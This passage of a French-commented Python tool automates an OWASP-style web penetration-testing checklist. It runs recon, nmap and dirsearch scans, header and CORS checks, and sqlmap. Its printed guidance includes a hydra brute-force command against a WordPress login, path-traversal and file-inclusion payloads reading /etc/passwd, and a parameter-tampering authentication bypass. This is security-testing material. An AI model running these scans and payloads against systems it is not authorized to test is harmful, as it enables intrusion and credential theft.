        self.__JAVASCRIPT_WEB_APP_LIBRAIRIES=["Cappuccino","Chaplin.js","Echo","JavaScriptMVC","JsRender/JsViews","Meteor","Mojito",
        "PureMVC","Rialto Toolkit","SproutCore","Vue.js","Wakanda Framework","Blockly","Cannon.js","MathJax","Modernizr",
        "Ajax framework"]
        self.__JAVASCRIPT_FRAMEWORK=["Angular","AngularJS","Apache Royale",
        "Backbone.js","Dojo","Ember.js","Enyo","Express.js","Ext JS","Google Web Toolkit",
        "jQWidgets","Knockout","MooTools","Node.js","React","SAP OpenUI5","script. aculo.us",
        "qooxdoo","SproutCore","Svelte","Vue.js","Wakanda","Webix","ZK"]

        self.__JAVASCRIPT = self.__JAVASCRIPT_CHARTING_LIBRAIRIES + self.__JAVASCRIPT_LIBRAIRIES + self.__JAVASCRIPT_WEB_APP_LIBRAIRIES + self.__JAVASCRIPT_FRAMEWORK

        ## RECOMMANDATIONS

        # Pages d'application DRUPAL par défault :
        self.__DEFAULT_FILES_DRUPAL = ["/core/CHANGELOG",
        "/core/INSTALL.mysql.txt","/core/INSTALL.pgsql.txt","/core/LICENSE",
        "/core/MAINTAINERS.txt","/core/UPDATE.txt","/core/COPYRIGHT.txt",
        "/themes/amptheme/LICENSE.txt"]

        # Pages d'application TYPO3 par défault :
        self.__DEFAULT_FILES_TYPO3 = ["/typo3conf/ext/dam_catedit/",
        "/typo3conf/ext/dam/","/typo3conf/ext/static_info_tables/",
        "/typo3conf/ext/a21glossary/","/typo3conf/ext/date2cal/",
        "/typo3conf/ext/irfaq/"]

    ## all automatique OTG

    """
    allOTG()

    Cette fonction lance toutes les tâches automatiques scriptables.

    """

    def allOTG(self):

        
        self.OTG_INFO_001()
        self.OTG_INFO_002()
        self.OTG_INFO_003()
        self.OTG_INFO_004()
        self.OTG_INFO_005()
        #self.OTG_INFO_007() => TODO : problème de threads
        self.OTG_INFO_008()
        self.OTG_INFO_009()
        self.OTG_INFO_010()

        self.OTG_CONFIG_001()
        self.OTG_CONFIG_002()
        #self.OTG_CONFIG_003()
        self.OTG_CONFIG_004()
        self.OTG_CONFIG_005()
        self.OTG_CONFIG_006()
        self.OTG_CONFIG_007()
        self.OTG_CONFIG_008()


        self.OTG_AUTHN_006()

        self.OTG_SESS_002()

        self.OTG_INPVAL_001()
        self.OTG_INPVAL_003()

        self.OTG_INPVAL_009()

        self.OTG_ERR_001()
        self.OTG_ERR_002()
        
        self.OTG_CRYPST_001()
        
        for domaine in self.__AllDomains:
            try:
                domaine.DisplayAllResults()
            except:
                pass


    ## OTG INFO

    def OTG_INFO_001(self):
         banniere("OTG INFO 001")
         for domaine in self.__AllDomains:
              objectif()
              print("Verification qu'il n'y a pas d'informations sensibles sur les moteurs de recherches concernant "+domaine.getName())

              test()
              print_domaine("Hôte : "+domaine.getName())

              print("Cherchons sur Google, Shodan :)\n")
              try:
                  domaine.checkReconnaissance()   
              except:
                  print_red("Problème OTG_INFO_001")           

         conclusion()
         print("[OK] Si aucun document confidentiel / mots de passe.")
         print("[KO] Si donnees sensibles trouvees.")

    def OTG_INFO_002(self):
         banniere("OTG INFO 002")
         objectif()

         print("Verification que la banniere Server ne divulgue pas d'informations critiques.")

         test()
         for domaine in self.__AllDomains:
                domaine.bannerServer(self.__HTTPSERVERHEADERS)

         conclusion()
         print("[OK] Si la version du serveur n'est pas presente")
         print("[KO] Si la version du serveur est presente.")

    def OTG_INFO_003(self):
         banniere("OTG INFO 003")

         objectif()
         print("Verification du contenu du fichier robots.txt")

         test()
         for domaine in self.__AllDomains:
                domaine.fileRobots()
              

         conclusion()
         print("[OK] Si aucun information confidentielle dans le /robots.txt")
         print("[KO] Sinon.")

    def OTG_INFO_004(self):
         banniere("OTG INFO 004")
         objectif()
         print("Scan NMAP (tous les ports) + Trouver les autres applications web + Verifier qu'elles ne sont pas vulnerables.")

         test()
         var= input("[?] Scan nmap 65536 ports ? [y/n]")
         if var == "y" or var == "Y":
             for domaine in self.__AllDomains:
                    domaine.allServicesNmap()
                    #print_red(domaine.getName()+"+ Ctrl C ")
         

         conclusion()
         print("[OK] Si pas de probleme avec les autres applications web.")
         print("[KO] Si probleme potentiel avec ces autres applications web.")



    def OTG_INFO_005(self):
         banniere("OTG INFO 005")
         objectif()

         print("Verification de la presence d'information ou de donnees sensibles dans les commentaires")  

         test()
         for domaine in self.__AllDomains:
            try:
                domaine.checkCommentaires(self.__SENSITIVES_COMMENTS)
            except:
                print_red("Problème OTG_INFO_005")
              
         conclusion()
         print("[OK] Si les commentaires n'ont pas de donnees sensibles.")
         print("[KO] Donnees sensibles (Ex: Version, CMS, mots de passe.)")

    def OTG_INFO_006(self):
         banniere("OTG INFO 006")
         objectif()
         print("Verification du point d'entree applicatif.")

         test()
         print("[+] Naviguer sur le site internet avec un proxy - reperer comment les parametres GET et POST sont utilises. ")
         print("    Verifier qu'il n'y a pas de donnees sensibles envoyees.")
         print("    Mauvaise utilisation : passage en parametre POST du prix d'un objet pouvant etre modifie cote client.")

         conclusion()
         print("[OK] Si les parametres utilises sont legitimes.")
         print("[KO] Dans le cas contraire.")

    def OTG_INFO_007(self):
         banniere("OTG INFO 007")
         objectif()
         print("Verification qu'il n'y à pas d'informations sensibles lors de la cartographie des flux applicatifs")

         test()
         print("Lancement de la commande suivante sur les domaines trouvés :")
         print("[+] Utiliser un outil de bruteforce de fichiers/dossiers comme Dirsearch :")
         print("     python3 /opt/dirsearch/dirsearch.py -r -b -u http(s)://domaine")
         print("     -e ~,doc,docx,pdf,php,xls,xlsx,rtf,odt,psw,ppt,pptx,sml,log,sql,mdb,html,htm,sh,sxw,bat,conf,config,ini,yaml,yml,txt,bak,backup,inc,js,ps,src,dev,old,inc,orig,tmp,tar,zip")
         print("     -x 400 -t 20 -w /usr/share/wordlists/FinalDics/finaldic.txt | tee -a domaine")
         print("\n\n\n")

         if os.path.isfile('/opt/dirsearch/dirsearch.py'):
            pass        
         else:
            os.system("cd /opt/ && git clone https://github.com/maurosoria/dirsearch.git")

         if os.path.isfile('/usr/share/wordlists/FinalDics/finaldic.txt'):
            pass
         else:
            os.system("cd /usr/share/wordlists/ && git clone https://github.com/C0wnuts/FinalDics.git")

         threads=[]
         HTTP = []
         HTTPS = []

         all_lien_http = []
         all_lien_https = []

         max_number_concurrent_dirsearch = 3 
         max_number_threads = 15

         while True:
            max_number_concurrent_dirsearch=input("Nombre maximum de dirsearch lancés en même temps : [3] ") or '3'
            try :
                res = int(max_number_concurrent_dirsearch)
                break
            except:
                print("La variable doit être un nombre.") 

         while True:
            max_number_threads=input("Nombre maximum de threads utilisés par la commande dirsearch : (15 ou 20)") or '15'
            try :
                res = int(max_number_threads)
                break
            except:
                print("La variable doit être un nombre.")          

         for domaine in self.__AllDomains:
            HTTP.append(domaine.getHTTP())
            HTTPS.append(domaine.getHTTPS())

         if len(HTTP) != 0:
            print_info("Liens HTTP pour le bruteforce dirsearch :")
         for lien_http in HTTP:
            for lien in lien_http:
                print_info("[+] "+lien)
                all_lien_http.append(lien)

         if len(HTTPS) != 0:
            print_info("Liens HTTPS pour le bruteforce dirsearch:")
         for lien_https in HTTPS:
            for lien in lien_https:
                print_info("[+] "+lien)
                all_lien_https.append(lien)

         print("\n")

         while len(all_lien_http) != 0:
            for i in range(int(max_number_concurrent_dirsearch)):
                if len(all_lien_http) == 0:
                    pass
                else:
                    cur_lien = all_lien_http.pop(0)
                    t = threading.Thread(target=checkDirectories, args=(cur_lien,max_number_threads))
                    max_number_concurrent_dirsearch = max_number_concurrent_dirsearch - 1
                    threads.append(t)
                    t.start()
                    
                for t in threads:
                    t.join()
                threads = []
         max_number_concurrent_dirsearch = 3

         while len(all_lien_https) != 0:
            for i in range(int(max_number_concurrent_dirsearch)):
                if len(all_lien_https) == 0:
                    pass
                else:
                    cur_lien = all_lien_https.pop(0)
                    t = threading.Thread(target=checkDirectories, args=(cur_lien,max_number_threads))
                    threads.append(t)
                    t.start()
                    
                for t in threads:
                    t.join()
                threads = []


         conclusion()
         print("[OK] Si le crawl amene des resultats legitimes. (en general, OTG INFO 007 est OK)")
         print("[KO] Dans le cas contraire (fichiers .xml , .conf, .inc, .bak trouves).")

    def OTG_INFO_008(self):
         banniere("OTG INFO 008")

         objectif()
         print("Verification que le framework ne s'affiche pas.")

         test()

         print("Exemples de frameworks : Zope, CakePHP, Kohana, Laravel, Adobe Coldfusion, Microsoft ASP.NET, ZK, Business Catalyst, Indexhibit.")
         
         for domaine in self.__AllDomains:
            try:
                domaine.checkFramework(self.__FRAMEWORKS) 
            except:
                print_red("Problème OTG_INFO_008")

         print("\n")
         print("Frameworks et Librairies Javascript :")

         for domaine in self.__AllDomains:
            domaine.grabJavaScript(self.__JAVASCRIPT)      

         conclusion()
         print("[OK] Framework non identifie.")
         print("[KO] Framework identifie")

    def OTG_INFO_009(self):
         banniere("OTG INFO 009")
         objectif()
         print("Verification que le type d'application hebergeant le site n'apparait pas.")
         
         test()
         print("Exemples d'applications : phpBB, Wordpress, Mediawiki, Joomla, Drupal, 1C-Bitrix, AMPcms, Django, DotNetNuke, e107, EPiServer, Graffiti CMS, Hotaru CMS, ImpressCMS, Indico, InstantCMS, Kentico CMS, MODx, TYPO3, Dynamicweb, LEPTON, Wix, VIVVO.")

         for domaine in self.__AllDomains:
            domaine.checkApplication(self.__APPLICATIONS)

             

         conclusion()
         print("[OK] Aucune application trouvee.")
         print("[KO] Application trouvee.")

    def OTG_INFO_010(self):
         banniere("OTG INFO 010")
         objectif()
         print("Est-il possible d'etablir l'architecture applicative ?")
         print("Presence de pare-feu ?")
         print("Filtrage ? ")
         print("LDAP, serveur RADIUS ?")

         test()
         print("[+] Lancement de l'outil waafw00f pour determiner s'il y a un pare-feu")

         for domaine in self.__AllDomains:
            domaine.checkFirewall()       
                   

         conclusion()
         print("[OK] Architecture non identifiee.")
         print("[KO] Architecture identifiee.")

    def OTG_INFO(self):
         os.system('clear')
         self.OTG_INFO_001()
         input("Appuyez sur une touche pour changer d'OTG INFO.")
         os.system('clear')
         self.OTG_INFO_002()
         input("Appuyez sur une touche pour changer d'OTG INFO.")
         os.system('clear')
         self.OTG_INFO_003()
         input("Appuyez sur une touche pour changer d'OTG INFO.")
         os.system('clear')
         self.OTG_INFO_004()
         input("Appuyez sur une touche pour changer d'OTG INFO.")
         os.system('clear')
         self.OTG_INFO_005()
         input("Appuyez sur une touche pour changer d'OTG INFO.")
         os.system('clear')
         self.OTG_INFO_006()
         input("Appuyez sur une touche pour changer d'OTG INFO.")
         os.system('clear')
         self.OTG_INFO_007()
         input("Appuyez sur une touche pour changer d'OTG INFO.")
         os.system('clear')
         self.OTG_INFO_008()
         input("Appuyez sur une touche pour changer d'OTG INFO.")
         os.system('clear')
         self.OTG_INFO_009()
         input("Appuyez sur une touche pour changer d'OTG INFO.")
         os.system('clear')
         self.OTG_INFO_010()
         input("Appuyez sur une touche pour changer d'OTG.")
         os.system('clear')



## OTG CONFIG

    def OTG_CONFIG_001(self):
     banniere("OTG CONFIG 001")

     objectif()
     print("Recherches d'interconnextions en liens avec le site internet / point faible rendant le site vulnerable.")
     
     test()
     print("[+] Dirsearch : Acces a des fichiers de configurations ?")
     print("[+] Presence de TCP TIMESTAMPS ?")

     for domaine in self.__AllDomains:
          domaine.checkTCPTIMESTAMPS()  

     print("\n[+] Logiciels non mis a jour introduisant des vulnerabilites ?")
     print("    => Regarder le resultat NESSUS")

     conclusion()
     print("[OK] Si pas de configuration trouvee / tcp timestamps / logiciels non deprecies.")
     print("[KO] Sinon.")


    def OTG_CONFIG_002(self):
     banniere("OTG CONFIG 002")

     objectif()
     print("Verification de la configuration applicative.")

     test()
     print("[+] Serveur avec installation par defaut ? ")
     print("    => Dirsearch  ")
     print("[+] Commentaire : Donnees sensibles?")
     print("    => Voir resultat OTG INTO 005")
     print("[+] Erreur systeme ex 40X 50X ?")
     print("    => Burp Intruder dans tous les parametres et regarde les codes retours")
     print("[+] Seuls les modules legitimes doivent etre accessibles (ex pas administration)")
     print("[+] Le serveur tourne avec un utilisateur a faibles privileges.")
     print("[+] Pas de deni de service possible.")
     print("[+] Fichiers de config suivants non accessibles : applicationHost.config , redirection.config , administration.config, machine.config et web.config\n")

     CONFIGS = self.__IIS_CONFIGS + self.__ASP_CONFIGS
     for domaine in self.__AllDomains:
          domaine.reqGetHTTP(CONFIGS,"OTG_CONFIG_002")
          domaine.reqGetHTTPS(CONFIGS,"OTG_CONFIG_002")

     conclusion()          
     print("[OK] Si aucun des points precedents")
     print("[KO] Sinon.")

    def OTG_CONFIG_003(self):
     banniere("OTG CONFIG 003")    

     objectif()
     print("Verification des extensions de fichiers.")

     test()     
     print("[+] Dirsearch => Sauf cas particulier, les types de fichiers suivants composes d'informations sensibles ne doivent jamais etre accessibles : ")
     print("    .asa .inc")
     print("    .zip .tar .gz .tgz . rara ... : archives")
     print("    .java : code source java")
     print("    .txt : fichier texte")
     print("    .pdf")
     print("    .doc, .rtf, .xls, .ppt , ... : documents offices")
     print("    .bak, .old : sauvegarde")
     print("[+] Pas d'inclusion de fichiers arbitraires")

     conclusion()
     print("[OK] Si les points suivants sont respectes.")
     print("[KO] Sinon.")

    def OTG_CONFIG_004(self):
     banniere("OTG CONFIG 004") 

     objectif()
     print("Verification des sauvegardes et fichiers non references.")

     test()
     print("[+] Crawl du site : correler les informations publiques")
     print("    => Si viewuser.asp est present : chercher edituser.asp , adduser.asp , deleteuser.asp ...")
     print("    => Si /app/user present : chercher /app/admin , /app/manager")

     print("[+] dirsearch")
     print("[+] Nessus")

     print("[+] Tentatives a l'aveugle. : ")

     for domaine in self.__AllDomains:
          domaine.reqGetHTTP(self.__RECOVERY_FILES,"OTG_CONFIG_004")
          domaine.reqGetHTTPS(self.__RECOVERY_FILES,"OTG_CONFIG_004")
     
     conclusion()
     print("[OK] Si aucun fichier de sauvegarde n'a ete identifie / fichier non legitime.")
     print("[KO] Sinon.")

    def OTG_CONFIG_005(self):
     banniere("OTG CONFIG 005")

     objectif()
     print("Reperage des interfaces d'administration.")

     test()

     for domaine in self.__AllDomains:
          domaine.reqGetHTTP(self.__ADMIN_INTERFACES,"OTG_CONFIG_005")
          domaine.reqGetHTTPS(self.__ADMIN_INTERFACES,"OTG_CONFIG_005")

     conclusion()
     print("[OK] Si pas d'interface d'administration trouve.")
     print("[KO] Sinon.")

    def OTG_CONFIG_006(self):
     banniere("OTG CONFIG 006")

     objectif()
     print("[OBJ] Recherche de methodes non autorisees : seules les methodes OPTIONS, GET, POST doivent etre utilisee.")
     
     for domaine in self.__AllDomains:
        domaine.checkHTTPMethods()
     

     conclusion()
     print("[OK] Si pas de methodes exotiques.")
     print("[KO] Sinon.")

    def OTG_CONFIG_007(self):
     banniere("OTG CONFIG 007")
     objectif()
     print("Test du Header HTTP Strict Transport Security (HSTS)")
     Strict = 0
     test()

     for domaine in self.__AllDomains:
        domaine.checkHSTS()

     conclusion()
     print("[OK] Si Strict-Transport-Security, max-age (et includeSubDomains) sont presents.")
     print("[KO] Sinon.")

    def OTG_CONFIG_008(self):
     banniere("OTG CONFIG 008")
     objectif()
     print("Test des acces cross domain : Verification du CORS - qu'il n'y a pas possibilité de demander des ressources depuis un domaine non légitime.")
     
     test()
     print("[+] Tentative d'acces aux ressources depuis une origine differente.")
          
     for domaine in self.__AllDomains:
        domaine.checkCORS()

     print("[+] Recherche des fichiers crossdomain.xml et clientaccesspolicy.xml :")     

     for domaine in self.__AllDomains:
          domaine.reqGetHTTP(self.__CORS,"OTG_CONFIG_008")
          domaine.reqGetHTTPS(self.__CORS,"OTG_CONFIG_008")
      
     conclusion()

     print("[OK] Si pas possible de changer l'origine des ressources partagees / Si pas de fichiers trouves.")
     print("[KO] Sinon.")

    def OTG_CONFIG_009(self):
     banniere("OTG CONFIG 009")
     objectif()
     print("Vérifier que les permissions fichiers sont correctes.")

     test()
     print("[+] Depuis un acces au serveur hebergeant l'application : namei -l /PathToCheck/")
     print("[+] Windows AccessEnum ")
     print("[+] Windows AccessChk ")

     conclusion()
     print("[OK] En general ce point est ok car on ne peut pas verifier sur l'ordinateur host.")
     print("[KO] Sinon.")


    def OTG_CONFIG(self):
     os.system('clear')
     self.OTG_CONFIG_001()
     input("Appuyez sur une touche pour changer d'OTG CONFIG.")
     os.system('clear')
     self.OTG_CONFIG_002()
     input("Appuyez sur une touche pour changer d'OTG CONFIG.")
     os.system('clear')
     self.OTG_CONFIG_003()
     input("Appuyez sur une touche pour changer d'OTG CONFIG.")
     os.system('clear')
     self.OTG_CONFIG_004()
     input("Appuyez sur une touche pour changer d'OTG CONFIG.")
     os.system('clear')
     self.OTG_CONFIG_005()
     input("Appuyez sur une touche pour changer d'OTG CONFIG.")
     os.system('clear')
     self.OTG_CONFIG_006()
     input("Appuyez sur une touche pour changer d'OTG CONFIG.")
     os.system('clear')
     self.OTG_CONFIG_007()
     input("Appuyez sur une touche pour changer d'OTG CONFIG.")
     os.system('clear')
     self.OTG_CONFIG_008()
     input("Appuyez sur une touche pour changer d'OTG CONFIG.")
     os.system('clear')
     self.OTG_CONFIG_009()
     input("Appuyez sur une touche pour changer d'OTG CONFIG.")
     os.system('clear')


## OTG-IDENT : Gestion des identités


    def OTG_IDENT_001(self):
     banniere("OTG IDENT 001")
     objectif()
     print("Vérifier la bonne permission des rôles.")

     test()
     print("[+] Exemple dans le cas d'un Wordpress :")
     print("    Un Super admin n'a pas les mêmes droits qu'un Administrator, qu'un Editeur, qu'un Auteur, qu'un Contributeur ou qu'un Abonné.")
     print("    Chaque rôle à un set de rôle bien défini.")
     print("    Le Super Admin : peut tout faire")
     print("    L'abonné peut uniquement lire les articles.")

     conclusion()
     print("[OK] Si pas de débordement dans les permissions d'un autre rôle possible")
     print("[KO] Dans le cas contraire.")



    def OTG_IDENT_002(self):
     banniere("OTG IDENT 002")
     objectif()
     print("Vérification du processus d'enregistrement des utilisateurs.")

     test()
     print("[+] Certains processus d'enregistrement demande une adresse mail ; d'autres un nom, une date de naissance, un pays, un numéro de mobile, un email et un CAPTCHA")

     conclusion()
     print("[OK] Si le processus est assez strict. En général ce point est OK")
     print("[KO] Dans le cas contraire.")

    def OTG_IDENT_003(self):
     banniere("OTG IDENT 003")
     objectif()
     print("Vérification du processus de validation des utilisateurs.")

     test()
     print("[+] Qui peut valider la création d'un utilisateur ?")
     print("[+] Les éléments utilisateur sont il supprimés par un administrateur ? ou un simple utilisateur.")

     conclusion()
     print("[OK] Si le processus est légitime.")
     print("[KO] Sinon.")

    def OTG_IDENT_004(self):
     banniere("OTG IDENT 004")
     objectif()
     print("Vérification de l'énumération des comptes utilisateurs via le mécanisme d'authentification")

     test()
     print("Regarder si l'application web divulgue des informations sur les comptes utilisateurs - Utiliser un proxy de type BURP ou WEBSCARAB")
     print("[+] Analyse des codes erreurs : Présence des informations lors de l'authentification : \"utilisateur existant\" ou \"mot de passe incorrect\"")
     print("     Est-ce que pour un nom d'utilisateur existant, il est simple de trouver le mot de passe associé ?")
     print("     En établissant une liste d'utilisateur, il est possible de brute forcer l'authentification avec des mots de passe par défaut")
     print("[+] Analyse des URLs : http://www.foo.com/err.jsp?User=baduser&Error=0 ou http://www.foo.com/err.jsp?User=gooduser&Error=2")
     print("     Dans le deuxième cas, l'identifiant envoyé est vrai.")
     print("[+] La réponse du serveur web : Si chaque utilisateur a un répertoire sur le site :")
     print("    http://www.foo.com/account1 :  403 forbidden ")
     print("    http://www.foo.com/account2 :  404 file Not Found")
     print("    => L'utilisateur account1 existe ")
     print("[+] Dans les titres des pages web : si la page retournée s'intitule \"Utilisateur Invalide\".")
     print("[+] Dans la réinitialisation du mot de passe il peut être possible d'énumérer les noms d'utilisateurs.")
     print("[+] Deviner l'identifiant : Si notre id est CN000100 , alors CN000101 existe sûrement.")

     conclusion()
     print("[OK] S'il n'est pas possible de deviner le nom d'utilisateur.")
     print("[KO] Sinon.")



    def OTG_IDENT_005(self):
     banniere("OTG IDENT 005")
     objectif()
     print("Vérifier que les identifiants ne peuvent pas être devinés facilement : Si John Doe se créé un compte, son identifiant est jdoe etc.")

     test()
     print("[+] Cherche la structure d'établissement des identifiants : est-elle facilement devinable ?")
     print("[+] Peut-on soumettre des noms d'utilisateurs aléatoires et obtenir une réponse sur son existence?")

     conclusion()
     print("[OK] S'il n'est pas possible de deviner le nom d'utilisateur.")
     print("[KO] Sinon.")


    def OTG_IDENT(self):
     os.system('clear')
     self.OTG_IDENT_001()
     input("Appuyez sur une touche pour changer d'OTG IDENT.")
     os.system('clear')
     self.OTG_IDENT_002()
     input("Appuyez sur une touche pour changer d'OTG IDENT.")
     os.system('clear')
     self.OTG_IDENT_003()
     input("Appuyez sur une touche pour changer d'OTG IDENT.")
     os.system('clear')
     self.OTG_IDENT_004()
     input("Appuyez sur une touche pour changer d'OTG IDENT.")
     os.system('clear')
     self.OTG_IDENT_005()
     input("Appuyez sur une touche pour changer d'OTG.")
     os.system('clear')

## OTG-AUTHN : Authentification

    def OTG_AUTHN_001(self):
     banniere("OTG AUTHN 001")
     objectif()
     print("Vérifier que les identifiants du formulaire d'authentification sont envoyés via un canal chiffré (TLS)")

     test()
     print("Utiliser Burp comme proxy et :")
     print("[+] Si la requête est de type POST http://toto.com/login => la destination est le site en HTTP donc pas chiffré.")
     print("[+] Si la requête est de type POST https://toto.com/login => la destination est le site en HTTPS chiffré.")
     print("[+] Si le canal sécurisé HTTPS est utilisé pour uniquement l'authentification mais que toutes les autres pages sont en HTTP :")
     print("    La requête est de type POST https://toto.com/login avec le Referer : http://toto.com/homepage ")
     print("    Cela signifie qu'on envoie les données en HTTPS mais qu'une attaque SSLSTRIP est possible - attaque de type homme du milieu")
     print("[+] Si la requête est de type GET https://toto.com/success.html?user=toto&pass=password => Les valeurs sont accessibles à tous.")

     conclusion()
     print("[OK] Si la transmission d'identifiant se fait via un canal sécurisé.")
     print("[KO] Sinon.")


    def OTG_AUTHN_002(self):
     banniere("OTG AUTHN 002")
     objectif()
     print("Vérifier que les identifiants/mots de passe par défaut des applications/interfaces web ont été changées.")

     test()
     print("[+] Tester les identifiants suivants:")
     print("    admin, administrator, root, system, guest, operator, ou super")
     print("    Avec les mots de passe suivant :")
     print("    password, pass123, password123, admin, ou guest")
     print("    Commande : hydra -l elliot -P dico 192.168.43.193 http-post-form \"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location\"")
     print("               OU Burp intruder")
     print("[+] Si l'application s'appelle fidens (ex: tomcat) : essayer fidens/fidens")
     print("[+] Si l'application créé les noms d'utilisateurs tel que user7811, tenter une attaque par brute force en changeant les chiffres + les mots de passe communs.")
     print("[+] Après avoir créé plusieurs identifiants, chercher une prédiction possible lors de l'attribution des noms.")

     conclusion()
     print("[OK] Si id/mdp par défaut")
     print("[KO] Sinon.")

    def OTG_AUTHN_003(self):
     banniere("OTG AUTHN 003")
     objectif()
     print("Vérification de l'usage d'un mécanisme de protection contre le bruteforce.")

     test()
     print("[+]  Tenter de se connecter 5 fois avec un identifiant correct et un mot de passe incorrect. Un mécanisme de brute force doit apparaitre, empêchant l'utilisateur de se connecter durant 15 minutes")
     print("[+]  Un captcha doit être utilisé pour éviter de multiples tentatives infructeuses.")

     conclusion()
     print("[OK] Si mécanisme anti brute force.")
     print("[KO] Sinon.")

    def OTG_AUTHN_004(self):
     banniere("OTG AUTHN 004")
     objectif()
     print("Vérifier qu'il n'est pas possible de contourner l'authentification.")

     test()
     print("[+] Parameter modification : Si le mécanisme d'authent est de type http://www.site.com/page.asp?authenticated=no ")
     print("    =>   nc -v 80 ; GET /page.asp?authenticated=yes HTTP/1.0 => success")
     print("[+] Session ID prediction : Si l'id des sessions est prévisible => forge d'un id de session => accès autorisé  ")
     print("[+] SQL injection : Présence d'une injection SQL qui contourne l'authentification")
     print("    => burp intruder dans les valeurs id et mdp du formulaire d'authentification.")
     print("    => sqlmap")

     try:
        import sqlmap
     except:
        os.system("pip3 install --upgrade sqlmap")

     for domaine in self.__AllDomains:
        domaine.sqlmap()

     



     conclusion()
     print("[OK] Si pas de contournement de l'authent.")
     print("[KO] Sinon.")

    def OTG_AUTHN_005(self):
     banniere("OTG AUTHN 005")
     objectif()
     print("Vérifier que le cookie ne stocke pas le mot de passe utilisateur.")

     test()
     print("[+] Sur Mozilla : F12 => Storage => Cookies")

     conclusion()
     print("[OK] Si les cookies ne stockent pas les mots de passe.")
     print("[KO] Sinon.")

    def OTG_AUTHN_006(self):
     banniere("OTG AUTHN 006")
     objectif()
     print("Vérification qu'aucune donnée sensible n'est gardée dans le cache du navigateur de l'utilisateur.")

     test()
     print("[+] Présence des headers : ")
     print("    \"Cache-Control: no-cache, no-store\" ou \"Expires: 0\" ou \"Pragma: no-cache\"")
     
     for domaine in self.__AllDomains:
          domaine.checkHeaders()
  

     print("[+] Vérification dans le cache navigateur : ")
     print("    Mozilla : ")
     print("             Lien accessible dans about:cache => puis vérifier")
     print("    Chrome : ")
     print("             Lien accessible dans chrome://cache")
     print("Idée : accéder à une application sensible (ex: Ged, ajout d'un document) ; déconnectez vous et regardez dans le cache navigateur si les informations sur l'inclusion de ce document est présent dans le cache.")

     conclusion()
     print("[OK] Si aucune information sensible .")
     print("[KO] Sinon.")


    def OTG_AUTHN_007(self):
     banniere("OTG AUTHN 007")
     objectif()
     print("Vérification de la complexité des mots de passe.")

     test()
     print("[+] Rechercher la politique de sécurité des mots de passe et regarder la robustesse d'un mot de passe respectant cette politique :")
     print("https://howsecureismypassword.net/")
     print("[+] Mots de passe faible : 8 caractères et moins - minuscule chiffre")
     print("    Mots de passe standard : Plus de 10 caractères - minuscule majuscule chiffre")
     print("    Mots de passe robuste : plus de 14 caractères - inuscule majuscule chiffre caractères spéciaux")

     conclusion()
     print("[OK] Si les mots de passe sont robustes.")
     print("[KO] Si la politique de sécurité autorise le mot de passe toto123.")    


    def OTG_AUTHN_008(self):
     banniere("OTG AUTHN 008")
     objectif()
     print("Vérification de la fonctionnalité de question secrète.")

     test()
     print("[+] La réponse à la question secrête est-elle prévisible ?")
     print("[+] Combien d'essai possible? Peut-on le bruteforcer ?")


     conclusion()
     print("[OK] Si la réponse à la question est légitime et complexe.")
     print("[KO] Sinon.")   



    def OTG_AUTHN_009(self):
     banniere("OTG AUTHN 009")
     objectif()
     print("Vérification de la sécurité de la fonctionnalité de réinitialisation des mots de passe.")

     test()
     print("[+] Peut-on réintialiser le mot de passe de n'importe qui ?")
     print("[+] Si le mécanisme de réinitialisation est vulnérable au CSRF")
     print("    => Ouvrir BURP SUITE. Ajouter le proxy lors de l'envoi du formulaire de réinitialisation de mdp.")
     print("    clique droit dans la requête => Engagement tools => Générate CSRF POC => Changer l'adresse mail de réinitalisation => \"test in browser\"")
     print("[+] Si pas de question secrête : problème de sécurité ")
     print("[+] Peut-on entrer un ancien mot de passe?")

     conclusion()
     print("[OK] Si la fonctionnalité n'a pas de problème particulier.")
     print("[KO] Sinon.")  

    def OTG_AUTHN_010(self):
     banniere("OTG AUTHN 010")
     objectif()
     print("Vérification de la sécurité des autres mécanismes d'authentification.")

     test()
     print("[+] Si l'authentification au site http://www.example.com donne accès à la page https://www.example.com/myaccount/ via du HTTPS")
     print("   Mais qu'il est aussi possible de se connecter via http://m.example.com/myaccount/ qui est l'application mobile, qui supporte du HTTP et qui permet une énumération des utilisateurs.")
     print("   Alors il y a un problème.")


     conclusion()
     print("[OK] Si l'anthentification entre la version ordinateur et normal ne change pas.")
     print("[KO] Sinon.") 


    def OTG_AUTHN(self):
     os.system('clear')
     self.OTG_AUTHN_001()
     input("Appuyez sur une touche pour changer d'OTG AUTHN.")
     os.system('clear')
     self.OTG_AUTHN_002()
     input("Appuyez sur une touche pour changer d'OTG AUTHN.")
     os.system('clear')
     self.OTG_AUTHN_003()
     input("Appuyez sur une touche pour changer d'OTG AUTHN.")
     os.system('clear')
     self.OTG_AUTHN_004()
     input("Appuyez sur une touche pour changer d'OTG AUTHN.")
     os.system('clear')
     self.OTG_AUTHN_005()
     input("Appuyez sur une touche pour changer d'OTG AUTHN.")
     os.system('clear')
     self.OTG_AUTHN_006()
     input("Appuyez sur une touche pour changer d'OTG AUTHN.")
     os.system('clear')
     self.OTG_AUTHN_007()
     input("Appuyez sur une touche pour changer d'OTG AUTHN.")
     os.system('clear')
     self.OTG_AUTHN_008()
     input("Appuyez sur une touche pour changer d'OTG AUTHN.")
     os.system('clear')
     self.OTG_AUTHN_009()
     input("Appuyez sur une touche pour changer d'OTG AUTHN.")
     os.system('clear')
     self.OTG_AUTHN_010()
     input("Appuyez sur une touche pour changer d'OTG.")
     os.system('clear')



## OTG-AUTHZ : Habilitations
    

    def OTG_AUTHZ_001(self):
     banniere("OTG AUTHNZ 001")
     objectif()
     print("Vérifier s'il est possible d'accéder à des documents sans l'habilitation nécessaire.")

     test()
     print("[+] Il y a t'il des requêtes associés à de la lecture de fichiers? ")
     print("[+] Y'a t'il des variables telles que :")
     print("    http://example.com/getUserProfile.jsp?item=ikki.html")
     print("    http://example.com/index.php?file=content")
     print("    http://example.com/main.cgi?home=index.htm")
     print("    Exploitation : http://example.com/getUserProfile.jsp?item=../../../../etc/passwd")
     print("                   http://example.com/index.php?file=http://www.owasp.org/malicioustxt")
     print("                   http://example.com/index.php?file=file:///etc/passwd")
     print("                   http://example.com/index.php?file=http://localhost:8080")
     print("                   http://example.com/index.php?file=http://192.168.0.2:9080")
     print("                   http://example.com/main.cgi?home=main.cgi")
     print("    Encodage \%2e\%2e\%2f représente ../    ;  ..\%c0\%af représente ../")
     print("    ==> BURP INTRUDER + All Attacks Unix")

     print("[+] Injections dans les cookies :")
     print("    Cookie: USER=1826cc8f:PSTYLE=GreenDotRed")
